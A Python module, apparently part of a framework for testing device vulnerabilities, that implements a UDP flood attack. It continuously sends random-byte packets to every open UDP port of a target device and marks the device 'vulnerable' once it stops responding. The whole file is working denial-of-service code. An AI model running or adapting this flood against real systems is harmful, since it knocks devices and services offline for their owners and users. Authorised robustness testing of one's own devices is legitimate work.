from generic_attack import *
import logging
log = logging.getLogger(__name__)
from scapy.all import *
import threading

class UdpFlood(GenericAttack):

    def __init__(self, attackName, attackConfig, deviceConfig):
        super(UdpFlood, self).__init__(attackName, attackConfig, deviceConfig)

    def initialize(self, result):
        self.running = True
        target = self.device['ip']
        global continuousAttack
        continuousAttack = self.config['continuous_attack']

        if self.device["vulnerable_ports"] is None:
            result.update({"status": "no open ports"})
            return

        if "udp" not in self.device["vulnerable_ports"].keys():
            result.update({"status": "no open ports"})
            return

        if "open" not in self.device["vulnerable_ports"]["udp"].keys():
            result.update({"status": "no open ports"})
            return

        """ Send packets
                """
        tstatus = threading.Thread(target=self.deviceStatus, args=(result,))
        tstatus.start()

        # Creates a socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        # Creates packet
        bytes = random._urandom(self.config['packet_size_in_bytes'])
        start_time = time.time()
        packetCount = 0
        while self.running:
            for port in self.device["vulnerable_ports"]["udp"]["open"]:
                sock.sendto(bytes, (target, port))
                packetCount += 1

        tstatus.join()
        result.update({"directed_traffic(bytes/sec)": (packetCount * self.config['packet_size_in_bytes']) / (
            time.time() - start_time), "attack_time:": (time.time() - start_time)})
        return

    def deviceStatus(self, result):
        max = 5
        detected = 0
        while self.running:
            if not self.is_alive():
                detected = detected + 1
                time.sleep(0.1)
                if detected == max:
                    result.update({"status": "vulnerable"})
                    global continuousAttack
                    if not continuousAttack:
                        self.running = False
                    return
        result.update({"status": "not_vulnerable"})
        return

    def shutdown(self):
        self.running = False

    def prerequisite(self):
        return ["PortVulnerabilityTest"]